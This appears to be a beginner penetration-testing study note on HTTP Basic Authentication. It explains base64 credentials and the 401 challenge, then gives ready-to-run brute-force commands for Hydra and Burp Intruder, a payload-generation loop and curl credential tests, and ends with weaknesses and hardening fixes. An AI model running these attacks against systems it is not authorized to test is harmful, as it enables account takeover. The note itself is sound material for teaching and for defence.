---
tags: [vapt, authentication, beginner]
difficulty: beginner
module: "16 - Authentication"
topic: "16.17 Basic Auth Cracking"
---

# 16.17 — Basic Auth Cracking

## What Is HTTP Basic Authentication?

```
HTTP BASIC AUTH:
  Browser sends credentials in every request using the Authorization header
  
  Format: Authorization: Basic <base64(username:password)>
  
  Example:
  Username: admin
  Password: password123
  
  Combined: admin:password123
  Base64:   YWRtaW46cGFzc3dvcmQxMjM=
  
  Header:   Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
  
DECODE:
  echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
  → admin:password123
  
NOTE: Base64 is NOT encryption! It's encoding.
      Anyone who intercepts the header can decode it immediately!
      → Always use HTTPS with Basic Auth!
```

---

## Identifying Basic Auth

```
BROWSER PROMPT:
  When navigating to a protected URL → browser shows a popup:
  "Sign in to [realm]"
  Username: _______
  Password: _______
  
  This is the browser's native Basic Auth dialog!

HTTP CHALLENGE:
  Request to protected resource:
  GET /admin HTTP/1.1
  Host: target.com
  
  Response (no credentials):
  HTTP/1.1 401 Unauthorized
  WWW-Authenticate: Basic realm="Admin Panel"
  
  Realm = name of the protected area
```

---

## Cracking with Hydra

```bash
# HTTP BASIC AUTH BRUTE FORCE:
hydra -l admin -P /usr/share/seclists/Passwords/rockyou-75.txt \
  target.com http-get /admin \
  -t 10 -w 3

# WITH HTTPS:
hydra -l admin -P passwords.txt -S target.com https-get /admin

# MULTIPLE USERNAMES:
hydra -L users.txt -P passwords.txt target.com http-get /admin

# SHOW FOUND CREDENTIALS:
hydra ... -vV  # verbose output
```

---

## Cracking with Burp Intruder

```
STEP 1: Browse to Basic Auth protected URL
  → Browser prompt appears → try any credentials (fail intentionally)

STEP 2: Observe in Burp HTTP History:
  GET /admin HTTP/1.1
  Authorization: Basic YWRtaW46dGVzdA==  ← intercept this!

STEP 3: Send to Intruder → Sniper mode
  Mark the base64 value as payload position:
  Authorization: Basic §YWRtaW46dGVzdA==§

STEP 4: Payload processing:
  Don't put passwords directly in payload!
  Need to generate base64-encoded "username:password"
  
  Option A: Pre-generate list:
  for pass in $(cat passwords.txt); do
    echo -n "admin:$pass" | base64
  done > basic_auth_payloads.txt
  
  Option B: Burp Payload Processing rules:
  Add rule: Prefix with "admin:"
  Add rule: Base64-encode
  → Now payload = password, automatically formatted!

STEP 5: Start attack → look for 200 response (vs 401 for failed)
```

---

## Manual Testing

```bash
# TEST A CREDENTIAL:
curl -v -u admin:password https://target.com/admin
# Or explicitly:
curl -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ=" https://target.com/admin

# DECODE CAPTURED HEADER:
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
→ admin:password

# GENERATE AUTH HEADER:
echo -n "admin:newpassword" | base64
→ YWRtaW46bmV3cGFzc3dvcmQ=
curl -H "Authorization: Basic YWRtaW46bmV3cGFzc3dvcmQ=" https://target.com/admin
```

---

## Security Issues with Basic Auth

```
PROBLEMS:
  1. Credentials sent on EVERY request (not just login)
     → Larger attack surface (more chances to intercept)
     
  2. No logout mechanism
     Browser caches credentials until closed
     → "Logout" button → just clears session on app side, not browser cache
     
  3. Credentials sent as base64 (trivially decoded if intercepted)
     → MUST use HTTPS!
     
  4. No rate limiting by default (depends on web server config)
  
  5. Password appears in: logs, proxy history, pcap files
     → Risk of credential exposure in logs
     
WHEN YOU SEE IT:
  - Old admin panels (cPanel, router interfaces, legacy apps)
  - REST API authentication (common for machine-to-machine)
  - Development/staging environments
  - Kibana/Elasticsearch/Grafana behind nginx basic auth
```

---

## Fix

```
IF BASIC AUTH MUST BE USED:
  ✓ Always HTTPS (never HTTP!)
  ✓ Strong passwords + rate limiting at web server level
  ✓ nginx: limit_req_zone for /protected-path
  ✓ Apache: mod_evasive or fail2ban
  
BETTER ALTERNATIVES:
  ✓ Form-based login with sessions + CSRF tokens
  ✓ OAuth 2.0 / OpenID Connect for user-facing apps
  ✓ API Keys or JWT Bearer tokens for APIs
  ✓ Client certificate authentication for high-security
```

---

## Related Notes
- [[02 - Password Brute Force]] — same techniques applied
- [[18 - HTTP Digest Auth Attacks]] — stronger alternative to Basic
- [[28 - Defense Rate Limiting Lockout MFA]] — hardening auth
